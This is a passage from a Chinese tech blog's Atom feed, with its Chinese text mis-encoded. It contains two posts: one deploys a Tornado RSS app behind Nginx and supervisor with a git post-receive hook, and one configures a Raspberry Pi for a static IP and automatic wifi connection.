    <content type="html"><![CDATA[<p>ä¸€ç›´åœ¨æƒ³æŠŠå¾®ä¿¡çš„å…¬ä¼—å·çš„æ–‡ç« å¯¼å‡ºä¸ºRSSé˜…è¯»ï¼Œæ–¹ä¾¿é˜…è¯»å’Œå‡å°‘å¯¹å¾®ä¿¡çš„ä¾èµ–ï¼Œåæ¥çœ‹åˆ°<a href="https://github.com/zhu327/rss">zhu327/rss</a> è¿™ä¸ªé¡¹ç›®ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨æ¥ç”Ÿæˆå¾®åšï¼Œå¾®ä¿¡å…¬ä¼—å·ï¼ŒçŸ¥ä¹æ—¥æŠ¥ RSS çš„Web APPã€‚ä½†æ˜¯è¿™ä¸ªé¡¹ç›®çš„demoéƒ¨ç½²åœ¨Red Hatçš„openshiftä¸Šï¼Œå›¿äºå¯¹è¿™ä¸ªcloudçš„æ“ä½œä¸æ˜¯å¾ˆç†Ÿï¼Œæ‰€ä»¥æƒ³ç€æŠŠè¿™ä¸ªé¡¹ç›®é‡æ–°éƒ¨ç½²åˆ°è‡ªå·±åœ¨DigitalOceançš„æœºå™¨ä¸Šï¼Œå°±forkäº†è¿™ä¸ªé¡¹ç›®å¼€å§‹å•¦ï¼</p><span id="more"></span><p>ä»¥ä¸‹æ¶‰åŠåˆ°çš„å†…å®¹æœ‰ï¼š</p><ul><li>Linuxåˆ›å»ºç”¨æˆ·å’Œä¿®æ”¹ç”¨æˆ·ç»„</li><li>git hookså®ç°è‡ªåŠ¨éƒ¨ç½²</li><li>tornadoé¡¹ç›®çš„åŸºæœ¬æ¡†æ¶ç»“æ„</li><li>supervisorç®¡ç†è¿›ç¨‹</li><li>Nginxé…ç½®HTTPæœåŠ¡ä»£ç†</li><li>DNSçš„è®°å½•æ·»åŠ </li></ul><h2><span id="ji-ben-fu-wu-qi-she-zhi">åŸºæœ¬æœåŠ¡å™¨è®¾ç½®</span></h2><p>å› ä¸ºä¹‹å‰å¹¶æ²¡æœ‰åœ¨æˆ‘çš„æœåŠ¡å™¨ä¸Šåˆ›å»ºè¿‡å…¶ä»–ç”¨æˆ·ï¼Œå¦‚æœç›´æ¥ç”¨rootç”¨æˆ·çš„è¯ä¸å¥½ï¼Œæ‰€ä»¥éœ€è¦ä¸“é—¨çš„ä¸€ä¸ªè´¦æˆ·æ¥è´Ÿè´£éƒ¨ç½²ã€‚</p><ol start="0"><li><p>ç™»é™†æœåŠ¡å™¨ï¼š<code>ssh root@&lt;server-ip&gt;</code></p></li><li><p>åˆ›å»ºä¸€ä¸ªç”¨æˆ·<code>deploy</code>: <code>sudo adduser deploy</code></p></li><li><p>å°†ç”¨æˆ·åŠ å…¥sudoersä¸­: <code>sudo usermod -a -G sudo deploy</code></p></li><li><p>æ·»åŠ è¿œç¨‹è¿æ¥çš„æƒé™ï¼Œè¿™æ ·å°±çœå»äº†è¾“å…¥å¯†ç äº†ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su - deploy</span><br><span class="line">mkdir .ssh</span><br><span class="line">chmod 700 .ssh</span><br><span class="line">touch .ssh/authorized_keys</span><br><span class="line">chmod 600 .ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>700</code>è¡¨ç¤ºåªæœ‰æ–‡ä»¶æ‹¥æœ‰è€…æ‰èƒ½è¯»ï¼Œå†™ä»¥åŠæ‰“å¼€æ–‡ä»¶ï¼Œ<code>600</code>è¡¨ç¤ºåªèƒ½è¯»å’Œå†™ã€‚</p></li><li><p>æ¥ç€å°†è‡ªå·±çš„å…¬é’¥åŠ å…¥<code>authorized_keys</code>æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªå…¬é’¥åœ¨è‡ªå·±æœ¬æœº<code>~.ssh/id_rsa.pub</code>ä¸­ã€‚æ²¡æœ‰çš„è¯å¯ä»¥ç”¨<code>ssh-keygen -t rsa -C &quot;qwh005007@gmail.com&quot;</code>æ¥ç”Ÿæˆã€‚</p></li></ol><h2><span id="chuang-jian-shi-yong-git-hooks-de-zi-dong-bu-shu">åˆ›å»ºä½¿ç”¨git hooksçš„è‡ªåŠ¨éƒ¨ç½²</span></h2><p>è‡ªåŠ¨éƒ¨ç½²çš„å¥½å¤„å°±æ˜¯çœå»äº†æ¯æ¬¡éƒ½è¦ä¸ŠæœåŠ¡å™¨ã€‚å¯ä»¥å‚è§ä¹‹å‰çš„ä¸€ç¯‡åšå®¢<a href="http://daozhang.info/deploy-projects-with-git-hooks/">ä½¿ç”¨ Git Hooks å®ç°é¡¹ç›®è‡ªåŠ¨éƒ¨ç½²</a> æ¥åˆ›å»ºè¿™ä¸ªè¿œç¨‹çš„git serverã€‚</p><p>è¿™é‡Œï¼Œæˆ‘ä»¬è¦å…ˆfork <a href="https://github.com/zhu327/rss">zhu327/rss</a> è¿™ä¸ªé¡¹ç›®ï¼Œç„¶åç”¨<code>git clone --bare rss rss.git</code>ç”ŸæˆåŸæ¥é¡¹ç›®çš„è£¸ä»“åº“ï¼Œç„¶åå°†å…¶å¤åˆ¶åˆ°æœåŠ¡å™¨ä¸Šã€‚æˆ‘ä½¿ç”¨çš„æ˜¯<code>~/remoteRepo/rss.git</code>åšä¸ºgit serverï¼Œ<code>~/deployment/rss</code>åšä¸ºçœŸæ­£ç”Ÿäº§çš„ä»£ç æ–‡ä»¶ç›®å½•ã€‚</p><p>å…¶ä¸­ï¼Œgit hooksä¸­çš„<code>post-receive</code>æ–‡ä»¶çš„å†…å®¹ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"># Check the remote git repository whether it is bare</span><br><span class="line">IS_BARE=$(git rev-parse --is-bare-repository)</span><br><span class="line">if [ -z &quot;$IS_BARE&quot; ]; then</span><br><span class="line">echo &gt;&amp;2 &quot;fatal: post-receive: IS_NOT_BARE&quot;</span><br><span class="line">exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">unset GIT_DIR</span><br><span class="line"># current user is git</span><br><span class="line">DeployPath=/home/deploy/deployment/rss</span><br><span class="line">if [ ! -d $DeployPath ] ; then</span><br><span class="line">echo &gt;&amp;2 &quot;fatal: post-receive: DEPLOY_DIR_NOT_EXIST: \&quot;$DeployPath\&quot;&quot;</span><br><span class="line">exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">cd $DeployPath</span><br><span class="line">git add . -A &amp;&amp; git stash</span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure><h2><span id="xiu-gai-yuan-dai-ma">ä¿®æ”¹æºä»£ç </span></h2><p><a href="https://github.com/zhu327/rss">zhu327/rss</a> é¡¹ç›®çš„éƒ¨ç½²åœ¨openshiftï¼Œä¸ºäº†å°†å…¶éƒ¨ç½²åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šï¼Œä¿®æ”¹æ˜¯å¿…é¡»çš„ã€‚</p><ul><li><p>åˆ é™¤äº†é¡¹ç›®ä¸­çš„openshift hookséƒ¨åˆ†</p></li><li><p>å°†å…¶ä¸­ç”¨åˆ°openshiftç¯å¢ƒå˜é‡<code>OPENSHIFT_DIY_IP</code>å’Œ<code>OPENSHIFT_DIY_PORT</code>ä¿®æ”¹ä¸ºå¯¹åº”çš„<code>localhost</code>å’Œ<code>8000</code>ç«¯å£</p></li><li><p>å°†<code>diy/templates/</code>ä¸­çš„<code>https://diy-devz.rhcloud.com</code>ä¿®æ”¹ä¸ºä¹‹åè¦ç”¨åˆ°çš„åœ°å€ <code>http://rss.daozhang.info</code></p></li><li><p>ç„¶åå°†ä¿®æ”¹å¥½çš„ä»£ç åœ¨æœ¬åœ°çš„virtualenvç¯å¢ƒä¸­æµ‹è¯•ï¼Œå¹¶ç”Ÿæˆéœ€è¦çš„pythonçš„æ¨¡å—æ–‡ä»¶<code>requirement.txt</code>ã€‚å¦‚ä¸‹ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Jinja2==2.7.3</span><br><span class="line">MarkupSafe==0.23</span><br><span class="line">backports.ssl-match-hostname==3.4.0.2</span><br><span class="line">certifi==2015.04.28</span><br><span class="line">lxml==3.4.4</span><br><span class="line">python-dateutil==2.4.2</span><br><span class="line">python-memcached==1.54</span><br><span class="line">six==1.9.0</span><br><span class="line">tornado==4.2</span><br><span class="line">wsgiref==0.1.2</span><br></pre></td></tr></table></figure></li></ul><p>è¿™äº›éƒ½å¥½äº†ä¹‹åå°±å¯ä»¥å°†æœ¬åœ°çš„æ–‡ä»¶ç¬¬ä¸€æ¬¡pushåˆ°æœåŠ¡å™¨ä¸Šäº†ã€‚å› ä¸ºä¹‹å‰å·²ç»è®¾ç½®å¥½äº†git hookï¼Œæ‰€ä»¥å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šçš„<code>deployment/rss</code>çœ‹åˆ°é¡¹ç›®çš„ä»£ç æ›´æ–°äº†ã€‚</p><h2><span id="shi-yong-supervisor-guan-li-jin-cheng">ä½¿ç”¨supervisorç®¡ç†è¿›ç¨‹</span></h2><p><code>supervisor</code>æ˜¯Linuxä¸­éå¸¸å¥½ç”¨çš„è¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨å®ƒå’ŒNginxä¸€èµ·æ¥ç»„æˆæˆ‘ä»¬çš„æœåŠ¡çš„éƒ¨ç½²ã€‚</p><ol><li><p>å®‰è£…supervisorï¼š<code>pip install supervisor</code> æˆ–è€… <code>sudo apt-get install supervisor</code></p></li><li><p>åˆ›å»ºä¸€ä¸ªç›®å½•æ¥è£…supervisorçš„é…ç½®æ–‡ä»¶ï¼š<code>mkdir -p ~/local/etc/supervisord</code></p></li><li><p>åˆ›å»ºsuperviosrçš„å‡ºè¦çš„é…ç½®æ–‡ä»¶ï¼š<code>touch ~/local/etc/supervisord.conf</code>ï¼Œå¹¶åŠ å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[unix_http_server]</span><br><span class="line">file=/home/deploy/tmp/supervisor.sock</span><br><span class="line"> </span><br><span class="line">[supervisord]</span><br><span class="line">user=deploy</span><br><span class="line">logfile=/home/deploy/logs/user/supervisord.log</span><br><span class="line">logfile_maxbytes=50MB</span><br><span class="line">logfile_backups=10 </span><br><span class="line">loglevel=info</span><br><span class="line">pidfile=/home/deploy/local/run/supervisord.pid supervisord.pid)</span><br><span class="line"> </span><br><span class="line">[rpcinterface:supervisor]</span><br><span class="line">supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface</span><br><span class="line"> </span><br><span class="line">[supervisorctl]</span><br><span class="line">serverurl=unix:///home/deploy/tmp/supervisor.sock</span><br><span class="line"> </span><br><span class="line">[include]</span><br><span class="line">files = /home/deploy/local/etc/supervisord/*.ini</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æˆ‘ä»¬éƒ½é€‚ç”¨ç”¨æˆ·ç›®å½•ä¸‹åˆ›å»ºçš„<code>local</code>ï¼Œ<code>logs</code>å’Œ<code>tmp</code>æ–‡ä»¶å¤¹æ¥è£…è¿™äº›æ–‡ä»¶ã€‚</p></li><li><p>åˆ›å»ºä¸€ä¸ªrss.iniçš„æ–‡ä»¶ç”¨æ¥ä½œä¸ºrssæœåŠ¡ï¼š<code>touch ~/local/etc/supervisord/rss.ini</code>ï¼Œæ”¾å…¥å¦‚ä¸‹å†…å®¹ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[program:rss]</span><br><span class="line">command=python2.7 /home/deploy/deployment/rss/diy/start.py</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>start.py</code>æ˜¯è¿™ä¸ªtornadoé¡¹ç›®çš„å…¥å£ã€‚</p></li><li><p>å¯åŠ¨æœåŠ¡ï¼š<code>supervisord -c /home/deploy/local/etc/supervisord.conf</code>ï¼Œå› ä¸ºç”¨çš„æ˜¯éé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œè¿™é‡ŒæŒ‡å®šç›¸åº”çš„é…ç½®æ–‡ä»¶ä½ç½®ã€‚</p></li><li><p>ä¸€æ—¦æˆ‘ä»¬åœ¨ä¹‹åä¿®æ”¹äº†é¡¹ç›®pushäº†ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦é‡æ–°å¯åŠ¨rssï¼š<code>supervisorctl restart rss</code>ï¼Œå› æ­¤ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œå¯ä»¥å°†è¿™æ¡å‘½ä»¤åŠ å…¥é¡¹ç›®git hooksä¸­çš„<code>post-receive</code>æ–‡ä»¶æœ«å°¾ã€‚</p></li></ol><h2><span id="pei-zhi-nginx">é…ç½®Nginx</span></h2><p>Nginxå¾ˆå¥½å¾ˆå¼ºå¤§ï¼Œæˆ‘ä»¬ç”¨å®ƒæ¥åšä¸ºæˆ‘ä»¬çš„HTTPæœåŠ¡å™¨ã€‚</p><ol><li><p>å®‰è£…Nginxï¼Œè¿™é‡Œï¼Œæˆ‘ä»¬é€‚ç”¨ä»æºä»£ç å®‰è£…Nginxï¼Œå¹¶é…ç½®ä¸€äº›logï¼Œpidç­‰çš„ç›®å½•åˆ°deployçš„ç”¨æˆ·ç›®å½•ä¸‹ï¼Œè¿™é‡Œï¼Œå†™ä¸€ä¸ªå®‰è£…çš„è„šæœ¬<code>install.sh</code>ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p ~/src</span><br><span class="line">mkdir -p ~/tmp/nginx/fcgi ~/tmp/nginx/proxy ~/tmp/nginx/client</span><br><span class="line"></span><br><span class="line">cd ~/src</span><br><span class="line">curl -O  http://nginx.org/download/nginx-1.2.1.tar.gz</span><br><span class="line">tar -xzvf nginx-1.2.1.tar.gz</span><br><span class="line">cd nginx-1.2.1</span><br><span class="line"></span><br><span class="line">./configure   --prefix=$HOME/local/nginx  \</span><br><span class="line">--sbin-path=$HOME/local/sbin/nginx \</span><br><span class="line">--conf-path=$HOME/local/etc/nginx.conf  \</span><br><span class="line">--error-log-path=$HOME/logs/user/nginx/error.log \</span><br><span class="line">--http-log-path=$HOME/logs/user/nginx/access.log \</span><br><span class="line">--pid-path=$HOME/local/run/nginx/nginx.pid \</span><br><span class="line">--lock-path=$HOME/local/lock/nginx.lock \</span><br><span class="line">--http-client-body-temp-path=$HOME/tmp/nginx/client/ \</span><br><span class="line">--http-proxy-temp-path=$HOME/tmp/nginx/proxy/  \</span><br><span class="line">--http-fastcgi-temp-path=$HOME/tmp/nginx/fcgi/ \</span><br><span class="line">--with-http_flv_module \</span><br><span class="line">--with-http_ssl_module \</span><br><span class="line">--with-http_gzip_static_module</span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>åœ¨Nginxçš„å®‰è£…è¿‡ç¨‹ä¸­ä¼šåˆ—å‡ºè¿™äº›é…ç½®ä¿¡æ¯ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Configuration summary</span><br><span class="line">  + using system PCRE library</span><br><span class="line">  + using system OpenSSL library</span><br><span class="line">  + md5: using OpenSSL library</span><br><span class="line">  + sha1: using OpenSSL library</span><br><span class="line">  + using system zlib library</span><br><span class="line"></span><br><span class="line">  nginx path prefix: &quot;/home/deploy/local/nginx&quot;</span><br><span class="line">  nginx binary file: &quot;/home/deploy/local/sbin/nginx&quot;</span><br><span class="line">  nginx configuration prefix: &quot;/home/deploy/local/etc&quot;</span><br><span class="line">  nginx configuration file: &quot;/home/deploy/local/etc/nginx.conf&quot;</span><br><span class="line">  nginx pid file: &quot;/home/deploy/local/run/nginx/nginx.pid&quot;</span><br><span class="line">  nginx error log file: &quot;/home/deploy/logs/user/nginx/error.log&quot;</span><br><span class="line">  nginx http access log file: &quot;/home/deploy/logs/user/nginx/access.log&quot;</span><br><span class="line">  nginx http client request body temporary files: &quot;/home/deploy/tmp/nginx/client/&quot;</span><br><span class="line">  nginx http proxy temporary files: &quot;/home/deploy/tmp/nginx/proxy/&quot;</span><br><span class="line">  nginx http fastcgi temporary files: &quot;/home/deploy/tmp/nginx/fcgi/&quot;</span><br><span class="line">  nginx http uwsgi temporary files: &quot;uwsgi_temp&quot;</span><br><span class="line">  nginx http scgi temporary files: &quot;scgi_temp&quot;</span><br></pre></td></tr></table></figure></li><li><p>æ·»åŠ è·¯å¾„åˆ°PATHä¸­ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/home/you/local/sbin:$PATH</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure></li><li><p>åˆ›å»ºé…ç½®æ–‡ä»¶ï¼š<code>~/local/etc/nginx.conf</code>ï¼Œåœ¨å…¶ä¸­æ·»åŠ æˆ‘ä»¬æœåŠ¡çš„é…ç½®ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#user  deploy;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">error_log /home/deploy/logs/user/nginx/error.log;</span><br><span class="line">pid /home/deploy/local/run/nginx/nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    upstream rsstornado &#123;</span><br><span class="line">        server 127.0.0.1:8000;</span><br><span class="line">    &#125;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    access_log /home/deploy/logs/user/nginx/access.log;</span><br><span class="line"></span><br><span class="line">    keepalive_timeout 65;</span><br><span class="line">    proxy_read_timeout 200;</span><br><span class="line">    sendfile on;</span><br><span class="line">    tcp_nopush on;</span><br><span class="line">    tcp_nodelay on;</span><br><span class="line">    gzip on;</span><br><span class="line">    gzip_min_length 1000;</span><br><span class="line">    gzip_proxied any;</span><br><span class="line">    # Relevant docs: http://wiki.nginx.org/HttpGzipModule#gzip_types</span><br><span class="line">    # Enables compression for additional MIME-types besides &quot;text/html&quot;.</span><br><span class="line">    # &quot;text/html&quot; is always compressed.</span><br><span class="line">    gzip_types text/plain text/css text/xml</span><br><span class="line">               application/x-javascript application/xml</span><br><span class="line">               application/atom+xml text/javascript;</span><br><span class="line"></span><br><span class="line">    # Only retry if there was a communication error, not a timeout</span><br><span class="line">    # on the Tornado server (to avoid propagating &quot;queries of death&quot;</span><br><span class="line">    # to all frontends)</span><br><span class="line">    proxy_next_upstream error;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        # server_name  localhost;</span><br><span class="line">        # Allow file uploads</span><br><span class="line">        client_max_body_size 50M;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass_header Server;</span><br><span class="line">            proxy_set_header Host $http_host;</span><br><span class="line">            proxy_redirect off;</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">            proxy_set_header X-Scheme $scheme;</span><br><span class="line">            proxy_pass http://rsstornado;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>upstream rsstornado</code>æŒ‡å‘äº†æˆ‘ä»¬çš„rssçš„ç«¯å£ã€‚</p></li><li><p>ä¹‹åä½¿ç”¨<code>/home/deploy/local/sbin/nginx -t</code>æ¥æ£€æŸ¥è¿™äº›é…ç½®ï¼ŒæœŸæœ›çš„è¾“å‡ºä¸ºï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx: the configuration file /home/deploy/local/etc/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /home/deploy/local/etc/nginx.conf test is successful</span><br></pre></td></tr></table></figure></li><li><p>è¿è¡ŒæœåŠ¡ï¼š<code>/home/deploy/local/sbin/nginx</code></p></li></ol><p>å¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œè¿™æ—¶ï¼Œæˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è¾“å…¥æœåŠ¡å™¨å¯¹åº”çš„ipæ—¶å°±å¯ä»¥çœ‹åˆ°è¿™ä¸ªweb appäº†ã€‚</p><h2><span id="tian-jia-a-ji-lu">æ·»åŠ <code>A</code>çºªå½•</span></h2><p>æœ€åçš„è¯éœ€è¦åœ¨è‡ªå·±çš„dnsæœåŠ¡å•†ä¸­æ·»åŠ ä¸€æ¡æŒ‡å‘æœåŠ¡å™¨ipçš„<code>A</code>è·ç¦»ï¼Œä¾‹å¦‚åœ¨ <a href="http://dns.he.net">he.net</a> ä¸­æ·»åŠ ä¸€æ¡<code>A</code>è®°å½•å³å¯ã€‚å¾ˆå¿«ï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨ <a href="http://rss.daozhang.info">http://rss.daozhang.info</a> è®¿é—®è¿™ä¸ªappäº†ã€‚</p><h2><span id="zui-hou">æœ€å</span></h2><p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±å®Œæˆäº†è¿™ä¸ªserverçš„é…ç½®ã€‚åœ¨æˆ‘éƒ¨ç½²è¿™ä¸ªserverçš„è¿‡ç¨‹ä¸­ï¼Œå¾®ä¿¡å¯¹åº”çš„RSSç”Ÿæˆçš„è§£æå®æ•ˆäº†ï¼Œæˆ‘è§‰å¾—æ˜¯å› ä¸ºsogouåœ¨å…¶urlä¸­æ·»åŠ äº†ä¸€ä¸ªåºåˆ—ï¼Œè¿™ä¸ªåºåˆ—æ˜¯æœ‰AESç®—æ³•å¾—å‡ºæ¥çš„ï¼Œå¹¶ä¸”ä¸€æ®µæ—¶é—´ä¼šæ¢ä¸€ä¸ªkeyæ¥ç”Ÿæˆè¿™ä¸ªåºåˆ—ï¼Œæ‰€ä»¥æˆ‘æš‚æ—¶ä¹Ÿä¸çŸ¥é“æ€ä¹ˆå¤„ç†è¿™ä¸ªï¼Œæœ‰å¾…è¿›ä¸€æ­¥ç ”ç©¶ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ä½¿ç”¨Nginxï¼Œsupervisoråœ¨DigitalOceanä¸­éƒ¨ç½²tornadoé¡¹ç›®
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>æ ‘è“æ´¾å¯åŠ¨æ—¶è‡ªåŠ¨è¿æ¥wifi</title>
    <link href="https://qiwihui.com/qiwihui-blog-16/"/>
    <id>https://qiwihui.com/qiwihui-blog-16/</id>
    <published>2018-10-09T05:31:11.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ç¯‡æ–‡ç« çš„ç›®çš„æ˜¯ä¸ºäº†é…ç½®æ ‘è“æ´¾ï¼Œä½¿å…¶åœ¨å¯åŠ¨æ—¶è‡ªåŠ¨è·å–é™æ€IP.</p><span id="more"></span><h2><span id="qi-dong-bing-lian-jie-shu-mei-pai">å¯åŠ¨å¹¶è¿æ¥æ ‘è“æ´¾</span></h2><h4><span id="1-qi-dong-shu-mei-pai-bing-zhao-dao-qi-ip-di-zhi">1. å¯åŠ¨æ ‘è“æ´¾å¹¶æ‰¾åˆ°å…¶IPåœ°å€</span></h4><p>æŠŠæ ‘è“æ´¾ç”¨ç½‘çº¿è¿æ¥åˆ°è·¯ç”±å™¨ä¸Šï¼Œæ’ä¸ŠSDå¡ï¼Œæ‰“å¼€æ ‘è“æ´¾ç”µæºï¼Œç­‰å¤§çº¦90ç§’.<br>åœ¨Macä¸Šæ‰“å¼€å‘½ä»¤è¡Œç»ˆç«¯ï¼Œè¾“å…¥<code>arp -a</code>å‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ°æ ‘è“æ´¾çš„ipåœ°å€ä¸º <code>192.168.199.199</code>.å½“ç„¶ä¹Ÿå¯ä»¥ä»è·¯ç”±å™¨åå°çœ‹åˆ°è¿™ä¸ªIPåœ°å€.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ arp -a</span><br><span class="line">? (169.254.99.51) at (incomplete) on en0 [ethernet]</span><br><span class="line">hiwifi.lan (192.168.199.1) at d4:ee:7:20:18:6e on en0 ifscope [ethernet]</span><br><span class="line">raspberrypi.lan (192.168.199.199) at f0:f6:1c:af:7a:28 on en0 ifscope [ethernet]</span><br></pre></td></tr></table></figure><h4><span id="2-shi-yong-ssh-lian-jie-shu-mei-pai">2. ä½¿ç”¨SSHè¿æ¥æ ‘è“æ´¾</span></h4><p>è¾“å…¥&quot;ssh <a href="mailto:pi@192.168.199.199">pi@192.168.199.199</a>&quot;, æ ¹æ®è¦æ±‚è¾“å…¥å¯†ç ï¼Œé»˜è®¤ä¸º<code>raspberry</code>.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh pi@192.168.199.199</span><br><span class="line">pi@192.168.199.199s password: </span><br><span class="line">Linux qiwihuisrpi 3.18.7+ <span class="comment">#755 PREEMPT Thu Feb 12 17:14:31 GMT 2015 armv6l</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Apr 17 14:45:28 2015 from 192.168.199.186</span><br></pre></td></tr></table></figure><h2><span id="pei-zhi-wang-luo-lian-jie">é…ç½®ç½‘ç»œè¿æ¥</span></h2><h4><span id="1-she-zhi-wang-luo-jie-kou-wen-jian-etc-network-interfaces">1. è®¾ç½®ç½‘ç»œæ¥å£æ–‡ä»¶<code>/etc/network/interfaces</code></span></h4><p>ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo nano /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto eth0</span><br><span class="line">allow-hotplug eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line"></span><br><span class="line">auto wlan0</span><br><span class="line">allow-hotplug wlan0</span><br><span class="line">iface wlan0 inet manual</span><br><span class="line"><span class="comment"># iface wlan0 inet dhcp # å¦‚æœæƒ³è‡ªåŠ¨è·å–ip</span></span><br><span class="line">wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®é™æ€ip</span></span><br><span class="line">iface wlan0 inet static</span><br><span class="line">address 192.168.199.199</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.199.1</span><br><span class="line"></span><br><span class="line">iface default inet dhcp</span><br></pre></td></tr></table></figure><h4><span id="2-she-zhi-wpa-supplicant-conf-pei-zhi-wen-jian">2. è®¾ç½®<code>wpa_supplicant.conf</code>é…ç½®æ–‡ä»¶</span></h4><p>ç¼–è¾‘æ–‡ä»¶<code>wpa_supplicant.conf</code>è®¾ç½®è¿æ¥çš„ç½‘ç»œçƒ­ç‚¹.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo nano /etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure><p>ä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class="line">update_config=1</span><br><span class="line"></span><br><span class="line">network=&#123;</span><br><span class="line">    ssid=<span class="string">&quot;YOUR_NETWORK_NAME&quot;</span></span><br><span class="line">    psk=<span class="string">&quot;YOU_NETWORK_PASSWORD&quot;</span></span><br><span class="line">    proto=RSN</span><br><span class="line">    key_mgmt=WPA-PSK</span><br><span class="line">    pairwise=CCMP</span><br><span class="line">    auth_alg=OPEN</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­:</p><ul><li><code>proto</code> å¯ä»¥æ˜¯ <code>RSN</code> (WPA2) æˆ–è€… <code>WPA</code> (WPA1).</li><li><code>key_mgmt</code> å¯ä»¥æ˜¯ <code>WPA-PSK</code> (å¤§éƒ¨åˆ†) æˆ–è€… <code>WPA-EAP</code> (ä¼ä¸šç½‘ç»œ)</li><li><code>pairwise</code> å¯ä»¥æ˜¯ <code>CCMP</code> (WPA2) æˆ–è€… <code>TKIP</code> (WPA1)</li><li><code>auth_alg</code> å¸¸ä¸º <code>OPEN</code>, å…¶ä»–å¯é€‰ä¸º <code>LEAP</code> å’Œ <code>SHARED</code></li></ul><p>é‡å¯æ ‘è“æ´¾ï¼Œä¹‹åå°±ä¼šè‡ªåŠ¨è¿ä¸Šwifiäº†.</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      æ ‘è“æ´¾å¯åŠ¨æ—¶è‡ªåŠ¨è¿æ¥wifi
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
